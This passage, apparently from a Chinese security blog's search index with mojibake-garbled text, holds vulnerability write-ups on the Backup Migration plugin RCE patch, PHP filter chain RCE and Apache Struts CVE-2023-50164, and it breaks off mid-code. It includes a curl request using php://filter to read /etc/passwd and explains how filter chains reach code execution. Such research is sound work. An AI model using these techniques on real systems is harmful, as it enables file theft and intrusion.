çš„RFCè§„å®šçš„ç‰¹æ€§æ¥é¢„ç½®å­—ç¬¦ï¼Œæ˜¯è¿™ä¸ªæ¼æ´ä¸­æœ€æœ‰æ„æ€çš„åœ°æ–¹ã€‚\nè¡¥ä¸åˆ†æ\nè¡¥ä¸ä¸­æ–°å¢äº†filterChainFixå‡½æ•°ï¼Œè¿‡æ»¤è¯·æ±‚å¤´ä¸­çš„ABSPATHå’ŒBMI_ROOT_DIRï¼Œè¿™ä¸ªå‡½æ•°é€šè¿‡è¿‡æ»¤PHPã€|ç­‰å¹¶ä¸”ä¸¥æ ¼é™åˆ¶å‚æ•°é•¿åº¦æ¥é¢„é˜²è¿™ä¸ªæ¼æ´åˆ©ç”¨ã€‚\n31\t// Filter and prevent PHP filter injection 32\tfunction filterChainFix($content) { 33 34\t// Make sure it exist and is string 35\tif (!is_string($content)) die(\u0026#34;Incorrect parameters.\u0026#34;); 36 37\t// Check if it\u0026#39;s not larger than max allowed path length (default systems) 38\tif (strlen($content) \u0026gt; 256) die(\u0026#34;Incorrect parameters.\u0026#34;); 39 40\t// Check if the path does not contain \u0026#34;php:\u0026#34; 41\tif (strpos($content, \u0026#34;php:\u0026#34;)) die(\u0026#34;Incorrect parameters.\u0026#34;); 42 43\t// Check if the path contain \u0026#34;|\u0026#34;, it\u0026#39;s not possible to use this character with our backups paths 44\tif (strpos($content, \u0026#34;|\u0026#34;)) die(\u0026#34;Incorrect parameters.\u0026#34;); 45 46\t// Check if the directory/file exist otherwise fail 47\tif (!(is_dir($content) || file_exists($content))) die(\u0026#34;Incorrect parameters.\u0026#34;); 48 49\t// Return correct content 50\treturn $content; 51 52\t} å‚è€ƒé“¾æ¥\nhttps://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup/backup-migration-137-unauthenticated-remote-code-execution\nhttps://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it\nhttps://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup/backup-migration-137-unauthenticated-remote-code-execution\nCreated at 2023-12-29T18:43:31+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/tags/php/","title":"PHP","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/research/web/php-filter-rce/","title":"PHP Filter RCE","tags":["å®‰å…¨ç ”ç©¶","PHP"],"description":"","content":"PHP filteræ˜¯ä»€ä¹ˆ PHP filteræ˜¯PHPå®šä¹‰çš„ä¸€ä¸ªä¼ªåè®®ï¼Œç”¨äºåœ¨æ•°æ®æµæ‰“å¼€æ—¶è¿›è¡Œç­›é€‰è¿‡æ»¤ï¼Œåœ¨æ•°æ®è¯»å–æˆ–è€…å†™å…¥çš„æ—¶å€™é€šè¿‡è¿‡æ»¤å™¨å¯¹æ•°æ®è¿›è¡Œå¤„ç†ã€‚PHP filter å¯ä»¥ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨è¿›è¡Œå¤„ç†ã€‚\nphp://filter/è¿‡æ»¤å™¨|è¿‡æ»¤å™¨/resource=å¾…è¿‡æ»¤çš„æ•°æ®æµ require_onceå’Œrequireçš„å‚æ•°æ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼ŒæŒ‡æ˜è¦åŒ…å«çš„æ–‡ä»¶ï¼Œè€ŒPHP filter æä¾›äº†æ¥å£ï¼Œä½¿å¾—å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å£è®¿é—®åˆ°æŒ‡å®šçš„æ–‡ä»¶å†…å®¹ï¼Œrequireåœ¨åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªå…³å¿ƒæ–‡ä»¶å†…å®¹ï¼Œè€Œä¸å…³å¿ƒæ–‡ä»¶å†…å®¹æ¥è‡ªäºä½•å¤„ï¼Œæ‰€ä»¥å¯ä»¥ç»™require ä¼ PHP filterå‚æ•°ï¼Œ\nå¦‚æœæœ‰å¦‚ä¸‹ä»£ç \n\u0026lt;?php $file = $_GET[\u0026#39;page\u0026#39;]; require($file); åˆ™å¯ä»¥é€šè¿‡å¦‚ä¸‹è¯·æ±‚æ³„éœ²æ•æ„Ÿä¿¡æ¯\ncurl \u0026#34;http://localhost/test.php?page=php://filter/convert.base64-encode/resource=/etc/passwd\u0026#34; PHPçš„base64decodeå‡½æ•°åœ¨å¤„ç†base64ç¼–ç çš„æ•°æ®æ—¶ï¼Œä¼šè‡ªåŠ¨è§„èŒƒåŒ–ï¼šå»é™¤å­—ç¬¦ä¸²ä¸­ä¸åˆæ³•çš„å­—ç¬¦å¹¶ä¸”å¿½ç•¥ï¼Œè€Œåå°è¯•è§£ç ã€‚ ä½†PHP filterçš„base64è§£ç è¡Œä¸ºå’Œbase64decodeè¡Œä¸ºç•¥æœ‰ä¸åŒï¼ŒPHP filterçš„base64-decodeä¸èƒ½å¤„ç†éšå³æ’å…¥çš„ç­‰å·ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨UTF-7ç¼–ç è§„é¿ï¼ŒUTF-7ç¼–ç ä¼šæŠŠç­‰å·è½¬åŒ–ä¸ºå…¶ä»–çš„base64å­—ç¬¦ã€‚\né€šè¿‡ç¼–ç å‰ç½®å­—ç¬¦ æ ¹æ®å®˜ç½‘é“¾æ¥çš„\rreference æ ¹æ®æ–‡æ¡£ï¼Œå¦‚æœå¼€å¯äº†iconvæ”¯æŒï¼Œåˆ™å¯ä»¥é€šè¿‡ä¼ªåè®®php://convert.iconv.*.*è°ƒç”¨iconvå‡½æ•°ã€‚\nconvert.iconv.\u0026lt;input-encoding\u0026gt;.\u0026lt;output-encoding\u0026gt; or convert.iconv.\u0026lt;input-encoding\u0026gt;/\u0026lt;output-encoding\u0026gt;\nlinuxä¸­å¯ä»¥ä½¿ç”¨iconvå‡½æ•°å°†å­—ç¬¦ä¸²ä»ä¸€ä¸ªç¼–ç è½¬ä¸ºå¦å¤–ä¸€ä¸ªç¼–ç ï¼Œåœ¨PHP://filterä¸­å¯ä»¥ä½¿ç”¨iconvè¿‡æ»¤å™¨è°ƒç”¨åˆ°è¿™ä¸ªå‡½æ•°\nphp -r \u0026#34;echo file_get_contents(\\\u0026#34;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/res ource=php://temp\\\u0026#34;);\u0026#34; GyQpQw+AD0APQ-# æŸäº›ç¼–ç è§„å®šè¯¥ç¼–ç ä¼šåœ¨æ•°æ®ä¹‹å‰é¢„ç½®ä¸€äº›å­—èŠ‚ï¼Œç›¸å½“äºç­¾åï¼Œæ ‡è¯†è¿™æ®µæ•°æ®æ˜¯è¯¥ç¼–ç  åœ¨\rRFC 2781ä¸­å°±è¯´æ˜è¯¥ç¼–ç ä¼šé¢„ç½®0XFEFF\nThe Unicode Standard and ISO 10646 define the character \u0026ldquo;ZERO WIDTH NON-BREAKING SPACE\u0026rdquo; (0xFEFF), which is also known informally as \u0026ldquo;BYTE ORDER MARK\u0026rdquo; (abbreviated \u0026ldquo;BOM\u0026rdquo;).This usage, suggested by Unicode and ISO 10646 Annex F (informative), is to prepend a 0xFEFF character to a stream of Unicode characters as a \u0026ldquo;signature\u0026rdquo;; a receiver of such a serialized stream may then use the initial character both as a hint that the stream consists of Unicode characters and as a way to recognize the serialization order. In serialized UTF-16 prepended with such a signature, the order is big-endian if the first two octets are 0xFE followed by 0xFF; if they are 0xFF followed by 0xFE, the order is little-endian. Note that 0xFFFE is not a Unicode character, precisely to preserve the usefulness of 0xFEFF as a byte-order mark.\nä¸‹å›¾ç»™å‡ºäº†å¦‚ä½•åœ¨å­—ç¬¦ä¸²å‰é¢é¢„ç½®8\né¦–å…ˆå°†UTF-8æ ¼å¼çš„å­—ç¬¦ä¸²startè½¬åŒ–ä¸ºUTF-16æ ¼å¼ UTF-16ä¼šåœ¨å­—ç¬¦ä¸²å‰é¢é¢„ç½®0xFFFE å‰é¢é¢„ç½®çš„0xFFåœ¨LATIN6è¡¨ä¸­å¯¹åº”äºÄ¸ è€Œåå°è¯•å°†è¿™ä¸ªå­—ç¬¦ä¸²ä»¥LATIN6æ ¼å¼è½¬åŒ–ä¸ºUTF-16æ ¼å¼ UTF-16ä¼šåœ¨å­—ç¬¦ä¸²å‰é¢é¢„ç½®0xFFFEï¼ŒÄ¸åœ¨UNICODEè¡¨ä¸­å¯¹åº”äº0x0138ï¼Œè€Œåé€ä¸ªæ‰“å°ï¼Œ0x38å˜æˆäº†8 LANTIN6è¡¨å¦‚ä¸‹ï¼š\nx0 x1 x2 x3 x4 x5 x6 x7 x8 x9 xA xB xC xD xE xF 0x 1x 2x SP ! \u0026quot; # $ % \u0026amp; ' ( ) * + , - . / 3x 0 1 2 3 4 5 6 7 8 9 : ; \u0026lt; = \u0026gt; ? 4x @ A B C D E F G H I J K L M N O 5x P Q R S T U V W X Y Z [ |] ^ _ 6x ` a b c d e f g h i j k l m n o 7x p q r s t u v w x y z { | } ~ 8x 9x Ax NBSP Ä„ Ä’ Ä¢ Äª Ä¨ Ä¶ Â§ Ä» Ä Å  Å¦ Å½ SHY Åª ÅŠ Bx Â° Ä… Ä“ Ä£ Ä« Ä© Ä· Â· Ä¼ Ä‘ Å¡ Å§ Å¾ â€• Å« Å‹ Cx Ä€ Ã Ã‚ Ãƒ Ã„ Ã… Ã† Ä® ÄŒ Ã‰ Ä˜ Ã‹ Ä– Ã Ã Ã Dx Ã Å… ÅŒ Ã“ Ã” Ã• Ã– Å¨ Ã˜ Å² Ãš Ã› Ãœ Ã Ã ÃŸ Ex Ä Ã¡ Ã¢ Ã£ Ã¤ Ã¥ Ã¦ Ä¯ Ä Ã© Ä™ Ã« Ä— Ã­ Ã® Ã¯ Fx Ã° Å† Å Ã³ Ã´ Ãµ Ã¶ Å© Ã¸ Å³ Ãº Ã» Ã¼ Ã½ Ã¾ Ä¸ UNICODEå¦‚ä¸‹ï¼š é€šè¿‡å°†æ¶æ„ä»£ç è½¬åŒ–ä¸ºbase64å½¢å¼ï¼Œè€Œåé€šè¿‡ç¼–ç é¢„ç½®å­—ç¬¦ï¼Œæœ€åä½¿ç”¨convert.base64-decodeå°è¯•è§£ç é¢„ç½®çš„æ•°æ®ï¼Œå°±å¯ä»¥ä½¿å¾—PHP filteræœ€åè§£ç å‡ºæ¶æ„ä»£ç ã€‚\nå½“ä½¿ç”¨requireæ—¶ï¼Œä¸”è·¯å¾„å¯æ§ï¼Œå°±å¯ä»¥åˆ©ç”¨PHP filteræ‰§è¡Œä»»æ„ä»£ç ã€‚\nå‚è€ƒé“¾æ¥\nhttps://gynvael.coldwind.pl/?id=671 https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it\nCreated at 2023-12-29T18:32:43+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/","title":"CVE 2023 50164 Apache Struts RCE","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ ç”±äº Struts æ¡†æ¶åœ¨å¤„ç†å‚æ•°åç§°å¤§å°å†™æ–¹é¢çš„ä¸ä¸€è‡´æ€§ï¼Œå¯¼è‡´æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ä¿®æ”¹å‚æ•°åç§°çš„å¤§å°å†™æ¥åˆ©ç”¨ç›®å½•éå†æŠ€æœ¯ä¸Šä¼ æ¶æ„æ–‡ä»¶åˆ°æœåŠ¡å™¨çš„éé¢„æœŸä½ç½®ï¼Œæœ€ç»ˆå¯¼è‡´ä»£ç æ‰§è¡Œã€‚\nå½±å“ç‰ˆæœ¬ 2.0.0\u0026lt;= Struts \u0026lt;= 2.3.37 2.5.0 \u0026lt;= Struts \u0026lt;= 2.5.32 6.0.0 \u0026lt;= Struts \u0026lt;= 6.3.0 ç¯å¢ƒæ­å»º ä½¿ç”¨vulhubèµ·ä¸€ä¸ªdockerç¯å¢ƒå³å¯ã€‚\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• æŸ¥çœ‹\rè¡¥ä¸å¯çŸ¥ï¼Œè¡¥ä¸ä¿®å¤å‰å¯¹äºæ–‡ä»¶åè¶…è¿‡maxStringLengthæ—¶ä¼šå°†é”™è¯¯æ¶ˆæ¯å’Œcontextæ·»åŠ åˆ°errorsä¹‹åç›´æ¥è¿”å›ï¼Œä¸ä¼šæ‰§è¡Œåˆ é™¤ä¸´æ—¶æ–‡ä»¶çš„é€»è¾‘ï¼Œåœ¨ä¿®å¤ä»£ç ä¸­åœ¨finallyè¯­å¥ä¸­æ‰§è¡Œitem.deleteæ¥åˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚\nparams.put(item.getFieldName(), values); item.delete(); åœ¨\rcommit d8c69691ef1d15e76a5f4fcf33039316da2340b6ä¸­ä¸»è¦æœ‰å¦‚ä¸‹å‡ ä¸ªä¿®å¤é€»è¾‘ï¼š å¯¹äºappendAllæ–¹æ³•åœ¨æ·»åŠ å‚æ•°ä¹‹å‰å…ˆä½¿ç”¨removeæ–¹æ³•ç§»é™¤å…ˆå‰çš„å‚æ•°ã€‚ å¯¹äºgetæ–¹æ³•ï¼Œä¿®æ”¹ä¸ºå¯¹å¤§å°å†™ä¸æ•æ„Ÿ è€Œremoveæ–¹æ³•å’Œcontainsæ–¹æ³•æœ‰å¦‚ä¸‹ä¿®æ”¹ï¼š åŸå…ˆçš„removeæ–¹æ³•ä¼šåŒºåˆ†å¤§å°å†™ï¼Œè€Œä¿®å¤åï¼Œremoveæ–¹æ³•ä»entrySetä¸­å¿½ç•¥å¤§å°å†™å¹¶åˆ é™¤å¯¹åº”çš„é¡¹ã€‚ å¯ä»¥çœ‹å‡ºè¿™ä¸ªcommitä¸»è¦æ˜¯å°†é”®å€¼å¯¹è·å–/ç§»é™¤çš„æ–¹æ³•ä¿®æ”¹ä¸ºå¤§å°å†™ä¸æ•æ„Ÿã€‚\næµ‹è¯•å•å…ƒä»£ç å¦‚ä¸‹ï¼Œæ·»åŠ äº†ä¸¤ä¸ªå•å…ƒæµ‹è¯•æ–¹æ³•\nshouldGetBeCaseInsensitive shouldAppendSameParamsIgnoringCase shouldGetBeCaseInsensitiveæµ‹è¯•HttpParameters.getæ–¹æ³•æ˜¯å¦æ˜¯å¤§å°å†™ä¸æ•æ„Ÿã€‚ shouldAppendSameParamsIgnoringCaseæµ‹è¯•ä½¿ç”¨HttpParameters.appendAllå‘Mapé‡Œé¢æ·»åŠ é”®å€¼å¯¹æ—¶æ˜¯å¦å¯¹keyå¤§å°å†™ä¸æ•æ„Ÿã€‚ å¯çŸ¥ä¿®å¤ä¸»è¦æ˜¯ä½¿å¾—HttpParametersç±»çš„ä¸€äº›æ–¹æ³•ä»å¤§å°å†™æ•æ„Ÿæ”¹ä¸ºå¤§å°å†™ä¸æ•æ„Ÿã€‚ å¯ä»¥çœ‹å‡ºè¡¥ä¸ä¸»è¦æ˜¯å¯¹HttpParametersè¿›è¡Œä¿®å¤ã€‚ public class HttpParametersTest { @Test public void shouldGetBeCaseInsensitive() { // given HttpParameters params = HttpParameters.create(new HashMap\u0026lt;String, Object\u0026gt;() {{ put(\u0026#34;param1\u0026#34;, \u0026#34;value1\u0026#34;); }}).build(); // then assertEquals(\u0026#34;value1\u0026#34;, params.get(\u0026#34;Param1\u0026#34;).getValue()); assertEquals(\u0026#34;value1\u0026#34;, params.get(\u0026#34;paraM1\u0026#34;).getValue()); assertEquals(\u0026#34;value1\u0026#34;, params.get(\u0026#34;pAraM1\u0026#34;).getValue()); } @Test public void shouldAppendSameParamsIgnoringCase() { // given HttpParameters params = HttpParameters.create(new HashMap\u0026lt;String, Object\u0026gt;() {{ put(\u0026#34;param1\u0026#34;, \u0026#34;value1\u0026#34;); }}).build(); // when assertEquals(\u0026#34;value1\u0026#34;, params.get(\u0026#34;param1\u0026#34;).getValue()); params = params.appendAll(HttpParameters.create(new HashMap\u0026lt;String, String\u0026gt;() {{ put(\u0026#34;Param1\u0026#34;, \u0026#34;Value1\u0026#34;); }}).build()); // then assertTrue(params.contains(\u0026#34;param1\u0026#34;)); assertTrue(params.contains(\u0026#34;Param1\u0026#34;)); assertEquals(\u0026#34;Value1\u0026#34;, params.get(\u0026#34;param1\u0026#34;).getValue()); assertEquals(\u0026#34;Value1\u0026#34;, params.get(\u0026#34;Param1\u0026#34;).getValue()); } } æŸ¥çœ‹strutsä»£ç äº¤å‰å¼•ç”¨ï¼Œå¯çŸ¥appendAllåœ¨å¦‚ä¸‹Interceptorä¸Šæœ‰å¼•ç”¨ åœ¨strutslçš„struts-default.xmlé‡Œé¢å®šä¹‰äº†é»˜è®¤çš„interceptorï¼Œå…¶ä¸­æ–‡ä»¶ä¸Šä¼ ç”±FileUploadInterceptoræ‹¦æˆªè¯·æ±‚ã€‚\n\u0026lt;interceptor name=\u0026#34;fileUpload\u0026#34; class=\u0026#34;org.apache.struts2.interceptor.FileUploadInterceptor\u0026#34;/\u0026gt; åŠ¨æ€è°ƒè¯• å‘é€å¦‚ä¸‹è¯·æ±‚ï¼Œå¹¶åœ¨org.apache.struts2.interceptor.FileUploadIntercepto#interceptæ–­ç‚¹ï¼š\nPOST /upload.action HTTP/1.1 Host: 127.0.0.1 Accept: */* Accept-Encoding: gzip, deflate Content-Length: 400 Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 --------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN Content-Disposition: form-data; name=\u0026#34;Upload\u0026#34;; filename=\u0026#34;1.txt\u0026#34; Content-Type: text/plain 1aaa --------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN åœ¨è°ƒè¯•å™¨ä¸­å¯ä»¥çœ‹åˆ°inputNameä¸ºè¡¨å•ä¸­nameå‚æ•°å¯¹åº”çš„å€¼ï¼Œstrutsä¼šå°è¯•æ ¹æ®inputNameè·å–content typeå’ŒfileNameï¼Œã€‚ è·Ÿè¿›multiWrapper.getFileNamesåˆ†å‘ä¸­ï¼Œåœ¨org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#getFileNamesä¸­å®ç°ï¼Œä»£ç å¦‚ä¸‹\npublic String[] getFileNames(String fieldName) { List\u0026lt;FileItem\u0026gt; items = (List)this.files.get(fieldName); if (items == null) { return null; } else { List\u0026lt;String\u0026gt; fileNames = new ArrayList(items.size()); Iterator var4 = items.iterator(); while(var4.hasNext()) { FileItem fileItem = (FileItem)var4.next(); fileNames.add(this.getCanonicalName(fileItem.getName())); } return (String[])fileNames.toArray(new String[fileNames.size()]); } } è·Ÿè¿›getCanonicalNameæ–¹æ³•å†…ï¼Œåœ¨getCanonicalNameæ–¹æ³•å†…è·å–äº†æ–œæ å’Œåæ–œæ çš„ä½ç½®ï¼Œå¦‚æœä¸ä¸º-1çš„è¯åˆ™ä¼šå¯¹æ–‡ä»¶åè¿›è¡Œæˆªæ–­ï¼Œå–åˆ°æœ€åä¸€ä¸ªæ–œæ åé¢çš„å­—ç¬¦ä¸²ä½œä¸ºæ–‡ä»¶åï¼Œé˜²æ­¢ç›®å½•ç©¿è¶Šã€‚\nå›åˆ°interceptæ–¹æ³•ä¸­ï¼Œåœ¨åé¢ä¼šæ‹¼æ¥inputNameç»„æˆcontentTypeNameå’ŒfileNameNameä½œä¸ºMapçš„keyï¼Œå¹¶å°†è·å–åˆ°çš„contentTypeå’ŒfileNameä½œä¸ºvalueåŠ å…¥åˆ°HashMapä¸­ï¼Œè€Œåé€šè¿‡appenAllæ–¹æ³•å°†HashMapæ·»åŠ åˆ°HttpParameterä¸­ åœ¨FileInterceptorè·å–åˆ°å‚æ•°ä¹‹åéœ€è¦å°†å‚æ•°é€šè¿‡Actionçš„setteræ–¹æ³•ç»‘å®šåˆ°Actionä¸­çš„å˜é‡ä¸Šã€‚ åœ¨å®šä¹‰çš„actionä¸­çš„setæ–¹æ³•æ–­ç‚¹ï¼Œé‡æ–°è°ƒè¯•ï¼Œå‘é€æ¶æ„è¯·æ±‚ï¼Œè°ƒè¯•å™¨ä¸­ä¸»è¦è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\nsetUpload:27, UploadAction (org.chestnut.action) invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect) invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect) invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect) invoke:567, Method (java.lang.reflect) invokeMethodInsideSandbox:1245, OgnlRuntime (ognl) invokeMethod:1230, OgnlRuntime (ognl) callAppropriateMethod:1958, OgnlRuntime (ognl) setMethodValue:2196, OgnlRuntime (ognl) setPossibleProperty:98, ObjectPropertyAccessor (ognl) setProperty:175, ObjectPropertyAccessor (ognl) setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor) setProperty:3359, OgnlRuntime (ognl) setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor) setProperty:3359, OgnlRuntime (ognl) setValueBody:134, ASTProperty (ognl) evaluateSetValueBody:220, SimpleNode (ognl) setValue:308, SimpleNode (ognl) setValue:829, Ognl (ognl) lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl) execute:-1, 769172083 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$369) compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl) setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl) trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl) setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl) setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl) setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor) doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor) intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor) executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2) invoke:253, DefaultActionInvocation (com.opensymphony.xwork2) doIntercept:152, ParametersInterceptor (com.opensymphony.xwork2.interceptor) intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor) executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2) invoke:253, DefaultActionInvocation (com.opensymphony.xwork2) intercept:202, StaticParametersInterceptor (com.opensymphony.xwork2.interceptor) åœ¨com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParametersæ–¹æ³•ä¸­å°è¯•å°†parametersçš„æ¯ä¸ªé”®å€¼å¯¹é€šè¿‡å‚æ•°ç»‘å®šè°ƒç”¨Actionçš„setteræ–¹æ³•ã€‚\nè·å–setteræ–¹æ³•çš„é€»è¾‘ å‚æ•°ç»‘å®šéœ€è¦è·å–Actionä¸­çš„æ–¹æ³•å¹¶è°ƒç”¨ï¼Œåœ¨Actionä¸­å¯¹åº”æ–¹æ³•ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹è°ƒç”¨æ ˆ\nsetUpload:27, UploadAction (org.chestnut.action) invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect) invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect) invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect) invoke:567, Method (java.lang.reflect) invokeMethodInsideSandbox:1245, OgnlRuntime (ognl) invokeMethod:1230, OgnlRuntime (ognl) callAppropriateMethod:1958, OgnlRuntime (ognl) setMethodValue:2196, OgnlRuntime (ognl) setPossibleProperty:98, ObjectPropertyAccessor (ognl) setProperty:175, ObjectPropertyAccessor (ognl) setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor) setProperty:3359, OgnlRuntime (ognl) setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor) setProperty:3359, OgnlRuntime (ognl) setValueBody:134, ASTProperty (ognl) evaluateSetValueBody:220, SimpleNode (ognl) setValue:308, SimpleNode (ognl) setValue:829, Ognl (ognl) lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl) execute:-1, 2098738059 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$371) compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl) setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl) trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl) setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl) setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl) setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor) doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor) intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor) executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2) invoke:253, DefaultActionInvocation (com.opensymphony.xwork2) doIntercept:152, ParametersInterceptor (com.opensymphony.xwork2.interceptor) intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor) executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2) invoke:253, DefaultActionInvocation (com.opensymphony.xwork2) intercept:202, StaticParametersInterceptor (com.opensymphony.xwork2.interceptor) åœ¨setMethodValue:2178, OgnlRuntime (ognl)æ–­ç‚¹ï¼Œé‡æ–°å‘é€è¯·æ±‚ï¼Œè·Ÿè¿›getSetMethodæ–¹æ³•æŸ¥çœ‹è·å–setteræ–¹æ³•çš„é€»è¾‘\nåœ¨getSetMethodæ–¹æ³•ä¸­ä¼šå°è¯•ä»ç¼“å­˜å–å‡ºUploadå¯¹åº”çš„æ–¹æ³•ï¼Œå¦‚æœå–å‡ºçš„methodä¸ä¸ºnullåˆ™ä¼šè¿”å›ï¼Œå¦‚æœä¸ºnullåˆ™ä¼šå°è¯•è°ƒç”¨_getSetMethodæ–¹æ³•ä»ç›®æ ‡classä¸­é€šè¿‡åå°„æ‹¼æ¥getä»ç›®æ ‡classä¸­è·å–åˆ°æ–¹æ³•ã€‚\npublic static Method getSetMethod(OgnlContext context, Class targetClass, String propertyName) throws IntrospectionException, OgnlException { Method method = cacheSetMethod.get(targetClass, propertyName); if (method == OgnlRuntime.ClassPropertyMethodCache.NULL_REPLACEMENT) { return null; } else if (method != null) { return method; } else { method = _getSetMethod(context, targetClass, propertyName); cacheSetMethod.put(targetClass, propertyName, method); return method; } } // å‚æ•° this.arg$3 = \u0026#39;this\u0026#39; is not available context = {OgnlContext@6991} size = 7 targetClass = {Class@6029} \u0026#34;class org.chestnut.action.UploadAction\u0026#34; propertyName = \u0026#34;Upload\u0026#34; method = {Method@6987} \u0026#34;public void org.chestnut.action.UploadAction.setUpload(java.io.File)\u0026#34; åœ¨_getSetMethodæ–¹æ³•ä¸­ä¼šè°ƒç”¨getDeclaredMethodsæ–¹æ³•è·å–ç›®æ ‡classä¸­å®šä¹‰çš„æŒ‡å®šæ–¹æ³•ï¼Œç›®æ ‡æ–¹æ³•é€šè¿‡propertyNameæŒ‡å®šï¼ŒgetDeclaredMethodsä¼šè°ƒç”¨collectAccessorsæ–¹æ³•\nprivate static Method _getSetMethod(OgnlContext context, Class targetClass, String propertyName) throws IntrospectionException, OgnlException { Method result = null; List methods = getDeclaredMethods(targetClass, propertyName, true); public static List getDeclaredMethods(Class targetClass, String propertyName, boolean findSets) { List result = null; ClassCache cache = _declaredMethods[findSets ? 0 : 1]; Map propertyCache = (Map)cache.get(targetClass); if (propertyCache == null || (result = (List)propertyCache.get(propertyName)) == null) { synchronized(cache) { Map propertyCache = (Map)cache.get(targetClass); if (propertyCache == null || (result = (List)((Map)propertyCache).get(propertyName)) == null) { String baseName = capitalizeBeanPropertyName(propertyName); List result = new ArrayList(); collectAccessors(targetClass, baseName, result, findSets); ..... return result == NotFoundList ? null : result; } åœ¨collectAccessorsæ–¹æ³•ä¸­é¦–å…ˆé€šè¿‡åå°„è·å–åˆ°ç›®æ ‡classçš„æ‰€æœ‰æ–¹æ³•ï¼Œè€Œåéå†æ‰€æœ‰æ–¹æ³•ï¼Œå¹¶ä¼ å…¥addIfAccessoræ–¹æ³•ä¸­ã€‚ addIfAccessorä¼šé¦–å…ˆåˆ¤æ–­ä¼ å…¥çš„æ–¹æ³•åæ˜¯å¦ä»¥ç›®æ ‡åå­—ç»“å°¾ï¼Œé€šè¿‡åˆ¤æ–­åä¼šé€šè¿‡æ‹¼æ¥get/set/isæ¥åˆ¤æ–­æ˜¯å¦æ˜¯ç›®æ ‡æ–¹æ³•ï¼Œç”±äºä¼ å…¥çš„findSetsæ˜¯trueï¼Œæ‰€ä»¥ä¼šæ‰¾åˆ°setMethodNameæ–¹æ³•æœ€ç»ˆå¾—åˆ°setUploadæ–¹æ³• private static void collectAccessors(Class c, String baseName, List result, boolean findSets) { Method[] methods; try { methods = c.getDeclaredMethods(); } catch (SecurityException var10) { methods = c.getMethods(); } for(int i = 0; i \u0026lt; methods.length; ++i) { if (c.isInterface()) { if (isDefaultMethod(methods[i]) || isNonDefaultPublicInterfaceMethod(methods[i])) { addIfAccessor(result, methods[i], baseName, findSets); } } else if (isMethodCallable(methods[i])) { addIfAccessor(result, methods[i], baseName, findSets); } } Class superclass = c.getSuperclass(); if (superclass != null) { collectAccessors(superclass, baseName, result, findSets); } Class[] var6 = c.getInterfaces(); int var7 = var6.length; for(int var8 = 0; var8 \u0026lt; var7; ++var8) { Class iface = var6[var8]; collectAccessors(iface, baseName, result, findSets); } } private static void addIfAccessor(List result, Method method, String baseName, boolean findSets) { String ms = method.getName(); if (ms.endsWith(baseName)) { 